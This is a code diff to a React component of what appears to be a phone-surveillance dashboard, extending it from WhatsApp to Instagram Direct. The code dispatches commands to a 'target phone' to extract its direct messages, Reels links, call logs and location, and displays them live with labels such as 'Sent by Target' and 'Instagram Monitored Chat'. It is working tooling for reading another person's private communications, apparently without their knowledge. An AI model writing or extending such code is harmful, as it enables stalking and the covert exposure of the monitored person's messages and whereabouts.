@@ -2,7 +2,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { apiClient } from "../api/client";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
-import type { WhatsAppChatSummary, WhatsAppMessage, WhatsAppCallEntry, CallLogEntry } from "../api/types";
+import type { WhatsAppChatSummary, WhatsAppMessage, WhatsAppCallEntry, CallLogEntry, InstagramChatSummary, InstagramMessage } from "../api/types";
 
 // ============================================================================
 // TYPES & DATA MODELS
@@ -51,9 +51,9 @@ const SUPPORTED_APPS: AppMetadata[] = [
     name: "Instagram Direct",
     packageName: "com.instagram.android",
     color: "#E1306C",
-    badge: "Coming Soon",
-    isSupported: false,
-    description: "DMs & shared post media",
+    badge: "Active",
+    isSupported: true,
+    description: "DMs, Reels links & shared media",
   },
   {
     id: "messenger",
@@ -74,7 +74,7 @@ export interface UnifiedChatSummary {
   lastMessageAt: string;
   lastIsOutgoing: boolean;
   totalMessages: number;
-  source: "whatsapp";
+  source: "whatsapp" | "instagram";
   isContactOnly?: boolean;
 }
 
@@ -86,6 +86,7 @@ export interface UnifiedChatMessage {
   timestamp: string;
   mediaType?: string | null;
   mediaPath?: string | null;
+  reelUrl?: string | null;
 }
 
 // ============================================================================
@@ -230,7 +231,11 @@ export function isContactSyncPlaceholder(text: string | null | undefined): boole
     "Recent conversation",
     "Tap to view conversation",
     "Click chat to get last 2 days conversation",
-    "WhatsApp Monitored Chat"
+    "WhatsApp Monitored Chat",
+    "Instagram Contact",
+    "Instagram Monitored Chat",
+    "Recent Instagram Chat",
+    "Recent Instagram conversation"
   ].includes(t)) return true;
   if (/^Message \+?[0-9\s-]+$/i.test(t)) return true;
   return false;
@@ -310,6 +315,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
   // Real Data States
   const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
+  const [instagramChats, setInstagramChats] = useState<InstagramChatSummary[]>([]);
   const [whatsAppCalls, setWhatsAppCalls] = useState<WhatsAppCallEntry[]>([]);
   const [selectedCallId, setSelectedCallId] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
@@ -341,24 +347,32 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
 
   // --------------------------------------------------------------------------
-  // 1. DATA LOADER: WHATSAPP CHATS, CALLS & REAL MESSAGES
+  // 1. DATA LOADER: WHATSAPP & INSTAGRAM CHATS, CALLS & REAL MESSAGES
   // --------------------------------------------------------------------------
   const loadDeviceChatData = async (isManual = false) => {
     if (isManual) setLoading(true);
     try {
       if (isManual) {
-        devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
-          devicesApi.createCommand(deviceId, "location_check").catch(() => {});
-        });
+        if (selectedApp === "instagram") {
+          devicesApi.createCommand(deviceId, "sync_instagram").catch(() => {});
+        } else {
+          devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
+            devicesApi.createCommand(deviceId, "location_check").catch(() => {});
+          });
+        }
       }
 
-      const [waData, callsResponse, rawCallLogs] = await Promise.all([
+      const [waData, callsResponse, rawCallLogs, igData] = await Promise.all([
         devicesApi.whatsAppChats(deviceId).catch((err) => {
           console.warn("WhatsApp chats fetch error:", err);
           return [] as WhatsAppChatSummary[];
         }),
         devicesApi.whatsAppCalls(deviceId).catch(() => ({ whatsapp_calls: [], device_calls: [] })),
         devicesApi.callLog(deviceId).catch(() => [] as CallLogEntry[]),
+        devicesApi.instagramChats(deviceId).catch((err) => {
+          console.warn("Instagram chats fetch error:", err);
+          return [] as InstagramChatSummary[];
+        }),
       ]);
 
       const isSystemNoise = (name: string | null | undefined): boolean => {
@@ -427,6 +441,30 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       cleanedChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
       setWhatsappChats(cleanedChats);
 
+      // 1b. Process Instagram Direct Chats
+      const cleanedIgChats: InstagramChatSummary[] = [];
+      const seenIgChats = new Set<string>();
+
+      for (const c of (igData || [])) {
+        if (!c.chat_name || !c.chat_name.trim()) continue;
+        if (isSystemNoise(c.chat_name)) continue;
+        const key = c.chat_name.trim().toLowerCase();
+        if (seenIgChats.has(key)) continue;
+
+        cleanedIgChats.push({
+          chat_name: c.chat_name.trim(),
+          username: c.username || null,
+          total_messages: c.total_messages || 0,
+          last_message_at: c.last_message_at || new Date().toISOString(),
+          last_message: c.last_message || null,
+          last_is_outgoing: Boolean(c.last_is_outgoing),
+        });
+        seenIgChats.add(key);
+      }
+
+      cleanedIgChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
+      setInstagramChats(cleanedIgChats);
+
       // 2. Process WhatsApp Calls (Strictly Last 5 Days)
       const mergedCallsMap = new Map<string, WhatsAppCallEntry>();
 
@@ -494,7 +532,12 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       eventSource.onmessage = (event) => {
         try {
           const payload = JSON.parse(event.data);
-          if (payload.type === "whatsapp_message" || payload.type === "sync" || payload.type === "new_data") {
+          if (
+            payload.type === "whatsapp_message" ||
+            payload.type === "instagram_message" ||
+            payload.type === "sync" ||
+            payload.type === "new_data"
+          ) {
             setLastSyncedTime(new Date());
             loadRef.current();
             if (fetchCurrentChatRef.current) {
@@ -573,14 +616,39 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     };
   }, [whatsappChatSummaries]);
 
+  // Formatted Instagram Direct Chat Summaries
+  const instagramChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
+    if (!instagramChats || instagramChats.length === 0) return [];
+    return instagramChats.map((c) => {
+      const hasRealMessage = c.last_message && !isPlaceholderOrNumber(c.last_message);
+      const displayLastMsg = hasRealMessage
+        ? c.last_message
+        : "Click chat to get last 2 days conversation";
+
+      return {
+        id: c.chat_name,
+        chatName: c.chat_name,
+        subtitle: c.username ? `@${c.username}` : "Instagram Direct",
+        lastMessage: displayLastMsg,
+        lastMessageAt: c.last_message_at,
+        lastIsOutgoing: c.last_is_outgoing,
+        totalMessages: c.total_messages,
+        source: "instagram",
+        isContactOnly: !hasRealMessage,
+      };
+    });
+  }, [instagramChats]);
+
   // Active Chats for the currently selected category tab (chats, channels)
   const activeCategoryChats = useMemo<UnifiedChatSummary[]>(() => {
     if (selectedApp === "whatsapp") {
       if (chatCategory === "chats") return whatsappPersonalChats;
       if (chatCategory === "channels") return channelChats;
+    } else if (selectedApp === "instagram") {
+      return instagramChatSummaries;
     }
     return [];
-  }, [selectedApp, chatCategory, whatsappPersonalChats, channelChats]);
+  }, [selectedApp, chatCategory, whatsappPersonalChats, channelChats, instagramChatSummaries]);
 
   // Filtered Chats by search within the currently active category
   const displayedChats = useMemo<UnifiedChatSummary[]>(() => {
@@ -608,7 +676,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
   // Auto-selection for active items
   useEffect(() => {
-    if (chatCategory === "calls") {
+    if (chatCategory === "calls" && selectedApp === "whatsapp") {
       if (displayedCalls.length > 0) {
         if (!selectedCallId || !displayedCalls.some((c) => c.id === selectedCallId)) {
           setSelectedCallId(displayedCalls[0].id);
@@ -640,7 +708,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         setSelectedChatId(null);
       }
     }
-  }, [chatCategory, displayedChats, displayedCalls]);
+  }, [chatCategory, displayedChats, displayedCalls, selectedApp]);
 
   const selectedCallSummary = useMemo(() => {
     return whatsAppCalls.find((c) => c.id === selectedCallId) || null;
@@ -652,6 +720,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const requestChatFromMobileApp = async (chatName: string, _isAutoSync = false) => {
     if (!chatName || !chatName.trim()) return;
     const cleanName = chatName.trim();
+    const isInstagram = selectedApp === "instagram";
 
     // Increment request ID so any previously running command poll aborts immediately
     const myRequestId = ++activeRequestIdRef.current;
@@ -664,19 +733,24 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       step: 1,
       percent: 25,
       title: "1. Request Sent",
-      detail: `Step 1/4: 📤 Dispatching fetch command for "${cleanName}" to target phone...`,
+      detail: `Step 1/4: 📤 Dispatching fetch command for "${cleanName}" (${isInstagram ? "Instagram Direct" : "WhatsApp"}) to target phone...`,
       status: "running",
       startedAt: new Date(),
     });
 
     try {
-      const matchedChat = whatsappChats.find(
-        (c) => c.chat_name?.trim().toLowerCase() === cleanName.toLowerCase()
-      );
-      const phoneNumber = matchedChat?.phone_number || undefined;
+      const commandType = isInstagram ? "get_instagram_chat" : "get_whatsapp_chat";
+      let phoneNumber: string | undefined = undefined;
+
+      if (!isInstagram) {
+        const matchedChat = whatsappChats.find(
+          (c) => c.chat_name?.trim().toLowerCase() === cleanName.toLowerCase()
+        );
+        phoneNumber = matchedChat?.phone_number || undefined;
+      }
 
       // Dispatch command to mobile app to fetch last 2 days conversation
-      const cmd = await devicesApi.createCommand(deviceId, "get_whatsapp_chat", {
+      const cmd = await devicesApi.createCommand(deviceId, commandType, {
         chatName: cleanName,
         phoneNumber,
         days: 2,
@@ -705,7 +779,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       step: 2,
                       percent: 50,
                       title: "2. Mobile Phone Received",
-                      detail: `Step 2/4: 📱 Target phone received command and is extracting conversation...`,
+                      detail: `Step 2/4: 📱 Target phone received command and is extracting ${isInstagram ? "Instagram Direct" : "WhatsApp"} conversation...`,
                       status: "running",
                     }
                   : prev
@@ -737,7 +811,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               // Verify message count after fetch
               setTimeout(() => {
                 if (activeRequestIdRef.current === myRequestId) {
-                  devicesApi.whatsAppMessages(deviceId, cleanName).then((msgs) => {
+                  const fetchMsgs = isInstagram
+                    ? devicesApi.instagramMessages(deviceId, cleanName)
+                    : devicesApi.whatsAppMessages(deviceId, cleanName);
+
+                  fetchMsgs.then((msgs: any[]) => {
                     if (activeRequestIdRef.current !== myRequestId) return;
                     if (msgs && msgs.length > 0) {
                       setSyncProgress({
@@ -794,7 +872,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         });
       }
     } catch (err: any) {
-      console.warn("Failed to dispatch get_whatsapp_chat command:", err);
+      console.warn("Failed to dispatch command:", err);
       if (activeRequestIdRef.current === myRequestId) {
         setSyncProgress({
           chatName: cleanName,
@@ -866,33 +944,32 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     }
 
     const currentChatName = selectedChatId;
+    const isInstagram = selectedApp === "instagram";
     let isMounted = true;
 
     const fetchChatMessages = (isInitial: boolean) => {
       // Only show full loading spinner if no messages are currently rendered
       if (isInitial && activeThreadMessages.length === 0) setMessagesLoading(true);
 
-      // Fetch all stored conversation messages for this chat directly from the DB
-      devicesApi.whatsAppDbCheck(deviceId).then((dbData) => {
-        console.log("===DB_CHECK_DATA===", JSON.stringify(dbData));
-      }).catch(() => {});
+      const fetchPromise = isInstagram
+        ? devicesApi.instagramMessages(deviceId, currentChatName)
+        : devicesApi.whatsAppMessages(deviceId, currentChatName);
 
-      devicesApi
-        .whatsAppMessages(deviceId, currentChatName)
-        .then((msgs: WhatsAppMessage[]) => {
+      fetchPromise
+        .then((msgs: (WhatsAppMessage | InstagramMessage)[]) => {
           if (!isMounted) return;
           if (selectedChatIdRef.current !== currentChatName) return;
-          console.log("===WHATSAPP_MSGS_FOR_CHAT===", currentChatName, msgs);
 
           // Do NOT drop messages using client-side strict date filters!
           // When the user clicked this chat, the mobile app already gathered the last 2 days
           // conversation and the server stored it in DB. Show whatever is in the DB as-is!
           const filtered = (msgs || []).filter((m) => {
-            if (!m.message_text && !m.media_path) return false;
+            if (!m.message_text && !m.media_path && !(m as any).reel_url) return false;
             const text = (m.message_text || "").trim();
             if (
               (isContactSyncPlaceholder(text) || text.includes("@s.whatsapp.net") || text.includes("@g.us")) &&
-              !m.media_path
+              !m.media_path &&
+              !(m as any).reel_url
             ) {
               return false;
             }
@@ -909,6 +986,12 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               rawText.startsWith("You: ") ||
               rawText.startsWith("You reacted ");
             const cleanText = rawText.startsWith("You: ") ? rawText.slice(5).trim() : rawText;
+
+            // Instagram Reel link detection: check reel_url property or URL regex
+            const reelUrl =
+              (m as any).reel_url ||
+              (cleanText.match(/https?:\/\/(?:www\.)?instagram\.com\/(?:reel|p|tv)\/[A-Za-z0-9_-]+/)?.[0] || null);
+
             const isImage =
               m.media_type === "image" ||
               cleanText.includes("📷") ||
@@ -920,8 +1003,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               text: cleanText,
               isOutgoing: isTargetSent,
               timestamp: m.message_time,
-              mediaType: isImage ? "image" : m.media_type,
+              mediaType: reelUrl ? "reel" : (isImage ? "image" : m.media_type),
               mediaPath: m.media_path,
+              reelUrl: reelUrl,
             };
           });
 
@@ -942,7 +1026,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   prev[i].id !== unified[i].id ||
                   prev[i].text !== unified[i].text ||
                   prev[i].isOutgoing !== unified[i].isOutgoing ||
-                  prev[i].mediaPath !== unified[i].mediaPath
+                  prev[i].mediaPath !== unified[i].mediaPath ||
+                  prev[i].reelUrl !== unified[i].reelUrl
                 ) {
                   isIdentical = false;
                   break;
@@ -955,7 +1040,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         })
         .catch((err) => {
           if (!isMounted) return;
-          console.warn("Failed to load WhatsApp messages:", err);
+          console.warn("Failed to load messages:", err);
         })
         .finally(() => {
           if (isMounted) setMessagesLoading(false);
@@ -969,7 +1054,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       isMounted = false;
       fetchCurrentChatRef.current = null;
     };
-  }, [selectedChatId, deviceId, timeFilter]);
+  }, [selectedChatId, deviceId, timeFilter, selectedApp]);
 
   // Grouped conversation messages by day (Today, Yesterday, etc.)
   const groupedMessages = useMemo(() => {
@@ -987,8 +1072,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   }, [activeThreadMessages]);
 
   const selectedChatSummary = useMemo(() => {
-    return whatsappChatSummaries.find((c) => c.id === selectedChatId) || null;
-  }, [whatsappChatSummaries, selectedChatId]);
+    const list = selectedApp === "instagram" ? instagramChatSummaries : whatsappChatSummaries;
+    return list.find((c) => c.id === selectedChatId) || null;
+  }, [selectedApp, instagramChatSummaries, whatsappChatSummaries, selectedChatId]);
 
   // --------------------------------------------------------------------------
   // 2-MINUTE AUTOMATIC RECURRING SYNC & COUNTDOWN LOOP
@@ -1238,19 +1324,24 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           <div className="space-y-1.5 flex-1 min-h-0 overflow-y-auto">
             {SUPPORTED_APPS.map((app) => {
               const isSelected = selectedApp === app.id;
-              const count = app.id === "whatsapp" ? whatsappPersonalChats.length : 0;
+              const count = app.id === "whatsapp" ? whatsappPersonalChats.length : app.id === "instagram" ? instagramChats.length : 0;
 
               return (
                 <button
                   key={app.id}
                   type="button"
                   onClick={() => {
-                    setSelectedApp(app.id);
-                    if (app.id !== "whatsapp") setActiveView("chats");
+                    if (selectedApp !== app.id) {
+                      setSelectedApp(app.id);
+                      setSelectedChatId(null);
+                      setActiveThreadMessages([]);
+                      setSyncProgress(null);
+                      if (app.id !== "whatsapp") setActiveView("chats");
+                    }
                   }}
                   className={`w-full text-left p-2.5 rounded-xl transition flex items-center gap-3 relative ${
                     isSelected
-                      ? "bg-white shadow-xs border border-gray-200/90 ring-1 ring-emerald-500/20"
+                      ? `bg-white shadow-xs border border-gray-200/90 ring-1 ${app.id === "instagram" ? "ring-pink-500/30" : "ring-emerald-500/20"}`
                       : "hover:bg-white/60 text-gray-700"
                   }`}
                 >
@@ -1275,14 +1366,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                         {app.name}
                       </span>
                       {isSelected && (
-                        <span className="w-2 h-2 rounded-full bg-emerald-500 shrink-0" />
+                        <span className={`w-2 h-2 rounded-full shrink-0 ${app.id === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                       )}
                     </div>
                     <div className="flex items-center gap-1.5 mt-0.5">
                       <span
                         className={`text-[9px] font-semibold px-1.5 py-0.2 rounded ${
                           app.isSupported
-                            ? "bg-emerald-100 text-emerald-800"
+                            ? app.id === "instagram"
+                              ? "bg-pink-100 text-pink-800"
+                              : "bg-emerald-100 text-emerald-800"
                             : "bg-gray-200/70 text-gray-600"
                         }`}
                       >
@@ -1300,15 +1393,27 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
             })}
           </div>
 
-          <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1 shrink-0">
-            <p className="font-semibold flex items-center gap-1">
-              <span>📱</span>
-              <span>WhatsApp Chats & Activity</span>
-            </p>
-            <p className="text-[10px] text-emerald-700 leading-tight">
-              Shows WhatsApp chats (Team lead, Kavin Bro, etc.), broadcast channels, and last 5 days calls from this device.
-            </p>
-          </div>
+          {selectedApp === "instagram" ? (
+            <div className="p-2.5 rounded-lg bg-pink-50/70 border border-pink-100 text-[11px] text-pink-900 space-y-1 shrink-0">
+              <p className="font-semibold flex items-center gap-1">
+                <span>📸</span>
+                <span>Instagram Direct Activity</span>
+              </p>
+              <p className="text-[10px] text-pink-800 leading-tight">
+                Shows target phone's Instagram Direct chats, shared Reels links, and last 2 days conversation history.
+              </p>
+            </div>
+          ) : (
+            <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1 shrink-0">
+              <p className="font-semibold flex items-center gap-1">
+                <span>📱</span>
+                <span>WhatsApp Chats & Activity</span>
+              </p>
+              <p className="text-[10px] text-emerald-700 leading-tight">
+                Shows WhatsApp chats (Team lead, Kavin Bro, etc.), broadcast channels, and last 5 days calls from this device.
+              </p>
+            </div>
+          )}
         </div>
 
         {/* =================================================================== */}
@@ -1363,7 +1468,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     <input
                       type="text"
                       placeholder={
-                        chatCategory === "calls"
+                        selectedApp === "instagram"
+                          ? "Search Instagram direct chats..."
+                          : chatCategory === "calls"
                           ? "Search WhatsApp calls & numbers..."
                           : chatCategory === "channels"
                           ? "Search channels..."
@@ -1385,80 +1492,96 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     )}
                   </div>
 
-                  {/* Exactly 3 Tabs: Chats | Channels | Calls */}
-                  <div className="bg-gray-200/70 p-1 rounded-lg grid grid-cols-3 text-[11px] font-semibold gap-1">
-                    <button
-                      type="button"
-                      onClick={() => setChatCategory("chats")}
-                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
-                        chatCategory === "chats"
-                          ? "bg-white text-emerald-900 shadow-xs font-bold"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                    >
-                      <span className="truncate">💬 Chats</span>
-                      <span
-                        className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                  {/* Tabs: WhatsApp (Chats | Channels | Calls) vs Instagram (Direct Messages) */}
+                  {selectedApp === "whatsapp" ? (
+                    <div className="bg-gray-200/70 p-1 rounded-lg grid grid-cols-3 text-[11px] font-semibold gap-1">
+                      <button
+                        type="button"
+                        onClick={() => setChatCategory("chats")}
+                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                           chatCategory === "chats"
-                            ? "bg-emerald-100 text-emerald-800"
-                            : "bg-gray-300/80 text-gray-700"
+                            ? "bg-white text-emerald-900 shadow-xs font-bold"
+                            : "text-gray-600 hover:text-gray-900"
                         }`}
                       >
-                        {whatsappPersonalChats.length}
-                      </span>
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => setChatCategory("channels")}
-                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
-                        chatCategory === "channels"
-                          ? "bg-white text-purple-900 shadow-xs font-bold"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                    >
-                      <span className="truncate">📢 Channels</span>
-                      <span
-                        className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                        <span className="truncate">💬 Chats</span>
+                        <span
+                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                            chatCategory === "chats"
+                              ? "bg-emerald-100 text-emerald-800"
+                              : "bg-gray-300/80 text-gray-700"
+                          }`}
+                        >
+                          {whatsappPersonalChats.length}
+                        </span>
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setChatCategory("channels")}
+                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                           chatCategory === "channels"
-                            ? "bg-purple-100 text-purple-800"
-                            : "bg-gray-300/80 text-gray-700"
+                            ? "bg-white text-purple-900 shadow-xs font-bold"
+                            : "text-gray-600 hover:text-gray-900"
                         }`}
                       >
-                        {channelChats.length}
-                      </span>
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => setChatCategory("calls")}
-                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
-                        chatCategory === "calls"
-                          ? "bg-white text-blue-900 shadow-xs font-bold"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                    >
-                      <span className="truncate">📞 Calls</span>
-                      <span
-                        className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                        <span className="truncate">📢 Channels</span>
+                        <span
+                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                            chatCategory === "channels"
+                              ? "bg-purple-100 text-purple-800"
+                              : "bg-gray-300/80 text-gray-700"
+                          }`}
+                        >
+                          {channelChats.length}
+                        </span>
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setChatCategory("calls")}
+                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                           chatCategory === "calls"
-                            ? "bg-blue-100 text-blue-800"
-                            : "bg-gray-300/80 text-gray-700"
+                            ? "bg-white text-blue-900 shadow-xs font-bold"
+                            : "text-gray-600 hover:text-gray-900"
                         }`}
                       >
-                        {whatsAppCalls.length}
+                        <span className="truncate">📞 Calls</span>
+                        <span
+                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
+                            chatCategory === "calls"
+                              ? "bg-blue-100 text-blue-800"
+                              : "bg-gray-300/80 text-gray-700"
+                          }`}
+                        >
+                          {whatsAppCalls.length}
+                        </span>
+                      </button>
+                    </div>
+                  ) : (
+                    <div className="bg-gradient-to-r from-purple-500/10 via-pink-500/10 to-rose-500/10 p-2 rounded-lg border border-pink-200/60 flex items-center justify-between text-xs font-semibold">
+                      <div className="flex items-center gap-2">
+                        <span className="w-6 h-6 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-xs shadow-2xs">
+                          📸
+                        </span>
+                        <span className="text-gray-900 font-bold">Direct Messages</span>
+                      </div>
+                      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-pink-100 text-pink-700 border border-pink-200">
+                        {instagramChats.length} {instagramChats.length === 1 ? "chat" : "chats"}
                       </span>
-                    </button>
-                  </div>
+                    </div>
+                  )}
 
                   <div className="flex items-center justify-between text-[10px] text-gray-400 px-1 pt-0.5">
                     <span>
-                      {chatCategory === "calls"
+                      {selectedApp === "instagram"
+                        ? `${displayedChats.length} ${displayedChats.length === 1 ? "chat" : "chats"} (DMs)`
+                        : chatCategory === "calls"
                         ? `${displayedCalls.length} ${displayedCalls.length === 1 ? "call" : "calls"} (last 5 days)`
                         : chatCategory === "channels"
                         ? `${displayedChats.length} ${displayedChats.length === 1 ? "channel" : "channels"}`
                         : `${displayedChats.length} ${displayedChats.length === 1 ? "chat" : "chats"}`}
                     </span>
-                    <span className="font-semibold text-emerald-600 flex items-center gap-1">
-                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                    <span className={`font-semibold flex items-center gap-1 ${selectedApp === "instagram" ? "text-pink-600" : "text-emerald-600"}`}>
+                      <span className={`w-1.5 h-1.5 rounded-full animate-pulse ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                       Live Real-Time
                     </span>
                   </div>
@@ -1466,7 +1589,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
                 {/* List Container: Calls View or Chats/Channels View */}
                 <div className="flex-1 min-h-0 overflow-y-auto divide-y divide-gray-100 overscroll-contain">
-                  {chatCategory === "calls" ? (
+                  {chatCategory === "calls" && selectedApp === "whatsapp" ? (
                     /* ================= CALLS LIST (LAST 5 DAYS) ================= */
                     loading && whatsAppCalls.length === 0 ? (
                       <div className="p-8 text-center text-xs text-gray-400 space-y-1">
@@ -1584,21 +1707,25 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       <div className="p-8 text-center text-xs text-gray-400 space-y-1">
                         <span className="animate-spin text-lg block">↻</span>
                         <p>
-                          Loading {chatCategory === "channels" ? "channels" : "chats"} from phone...
+                          Loading {selectedApp === "instagram" ? "Instagram chats" : chatCategory === "channels" ? "channels" : "chats"} from phone...
                         </p>
                       </div>
                     ) : displayedChats.length === 0 ? (
                       <div className="p-8 text-center text-xs text-gray-400 space-y-2">
                         <span className="text-2xl block">
-                          {chatCategory === "channels" ? "📢" : "💬"}
+                          {selectedApp === "instagram" ? "📸" : chatCategory === "channels" ? "📢" : "💬"}
                         </span>
                         <p className="font-semibold text-gray-700">
-                          {chatCategory === "channels"
+                          {selectedApp === "instagram"
+                            ? "No Instagram chats found"
+                            : chatCategory === "channels"
                             ? "No WhatsApp channels found"
                             : "No WhatsApp chats found"}
                         </p>
                         <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
-                          {chatCategory === "channels"
+                          {selectedApp === "instagram"
+                            ? "Instagram Direct messages, DMs, and shared Reels from this phone will appear here."
+                            : chatCategory === "channels"
                             ? "WhatsApp broadcast channels and community updates from this phone appear here."
                             : "WhatsApp chats (e.g. Team lead, Kavin Bro, Niklaus) from this phone appear here."}
                         </p>
@@ -1607,6 +1734,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       displayedChats.map((c) => {
                         const isSelected = selectedChatId === c.id;
                         const isChannelItem = isWhatsAppChannel(c);
+                        const isInstagram = c.source === "instagram";
                         const isRequestingThis = requestingChat === c.chatName;
                         return (
                           <div
@@ -1614,22 +1742,26 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             onClick={() => handleSelectChat(c)}
                             className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
                               isSelected
-                                ? "bg-emerald-50/60 border-l-4 border-emerald-500 shadow-2xs"
+                                ? isInstagram
+                                  ? "bg-pink-50/60 border-l-4 border-pink-500 shadow-2xs"
+                                  : "bg-emerald-50/60 border-l-4 border-emerald-500 shadow-2xs"
                                 : "hover:bg-gray-50/80"
                             }`}
                           >
                             {/* Avatar */}
                             <div
                               className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
-                                isChannelItem
+                                isInstagram
+                                  ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
+                                  : isChannelItem
                                   ? "bg-gradient-to-br from-purple-500 to-indigo-600"
                                   : "bg-gradient-to-br from-emerald-500 to-teal-600"
                               }`}
                             >
-                              {isChannelItem ? "📢" : c.chatName.charAt(0).toUpperCase()}
+                              {isInstagram ? c.chatName.charAt(0).toUpperCase() : isChannelItem ? "📢" : c.chatName.charAt(0).toUpperCase()}
                               <span
                                 className={`absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${
-                                  isChannelItem ? "bg-indigo-400" : "bg-emerald-400"
+                                  isInstagram ? "bg-pink-400" : isChannelItem ? "bg-indigo-400" : "bg-emerald-400"
                                 }`}
                               />
                             </div>
@@ -1657,7 +1789,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 title={c.lastMessage || ""}
                               >
                                 {c.lastIsOutgoing ? (
-                                  <span className="text-emerald-600 font-bold text-[10px] shrink-0" title="Sent by Target">
+                                  <span className={isInstagram ? "text-pink-600 font-bold text-[10px] shrink-0" : "text-emerald-600 font-bold text-[10px] shrink-0"} title="Sent by Target">
                                     ↗ Sent:
                                   </span>
                                 ) : c.lastMessage && !c.isContactOnly ? (
@@ -1665,14 +1797,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                     ↙ Recv:
                                   </span>
                                 ) : null}
-                                <span className={c.isContactOnly ? "text-emerald-700 italic font-medium truncate" : "truncate"}>
+                                <span className={c.isContactOnly ? (isInstagram ? "text-pink-700 italic font-medium truncate" : "text-emerald-700 italic font-medium truncate") : "truncate"}>
                                   {c.lastMessage || "(No messages yet)"}
                                 </span>
                               </p>
 
                               <div className="mt-1 flex items-center gap-1.5 flex-wrap">
                                 {isRequestingThis ? (
-                                  <span className="text-[9px] font-semibold bg-emerald-100 text-emerald-800 px-1.5 py-0.2 rounded animate-pulse flex items-center gap-1">
+                                  <span className={`text-[9px] font-semibold px-1.5 py-0.2 rounded animate-pulse flex items-center gap-1 ${
+                                    isInstagram ? "bg-pink-100 text-pink-800" : "bg-emerald-100 text-emerald-800"
+                                  }`}>
                                     <span className="animate-spin text-[8px]">↻</span> Requesting from phone...
                                   </span>
                                 ) : (
@@ -1682,12 +1816,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 )}
                                 <span
                                   className={`text-[9px] font-semibold uppercase px-1.5 py-0.2 rounded border ${
-                                    isChannelItem
+                                    isInstagram
+                                      ? "bg-pink-50 text-pink-700 border-pink-200"
+                                      : isChannelItem
                                       ? "bg-purple-50 text-purple-700 border-purple-200"
                                       : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                   }`}
                                 >
